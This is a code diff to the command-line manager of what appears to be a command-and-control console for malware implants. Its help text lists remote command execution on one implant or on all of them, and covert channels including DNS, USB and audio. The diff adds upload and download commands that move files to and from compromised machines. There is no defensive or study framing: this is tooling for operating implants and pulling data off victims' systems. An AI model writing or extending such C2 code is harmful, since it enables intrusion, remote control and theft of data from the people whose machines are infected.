@@ -86,6 +86,24 @@ bool CLIManager::ProcessInput(const std::string& input, std::ostream& out) {
         return true;
     }
 
+    if (cmd == "upload") {
+        if (tokens.size() >= 4) {
+            if (handlers_.uploadFile) handlers_.uploadFile(tokens[1], tokens[2], tokens[3]);
+        } else {
+            out << "[!] Usage: upload <id> <local_path> <remote_path>" << std::endl;
+        }
+        return true;
+    }
+
+    if (cmd == "download") {
+        if (tokens.size() >= 4) {
+            if (handlers_.downloadFile) handlers_.downloadFile(tokens[1], tokens[2], tokens[3]);
+        } else {
+            out << "[!] Usage: download <id> <remote_path> <local_path>" << std::endl;
+        }
+        return true;
+    }
+
     if (cmd == "usb_status") {
         if (handlers_.checkUSBStatus) handlers_.checkUSBStatus();
         return true;
@@ -150,6 +168,8 @@ void CLIManager::PrintHelp(std::ostream& out) const {
 |  COMMAND EXECUTION:                                           |
 |    exec <id> <command> [ch]     - Execute on specific implant |
 |    broadcast <command>          - Execute on ALL implants    |
+|    upload <id> <local> <remote> - Upload a file to implant      |
+|    download <id> <remote> <local> - Download a file from implant |
 |                                                               |
 |  CHANNEL CONTROL:                                             |
 |    Channels: tcp, https, dns, usb, audio, auto                |
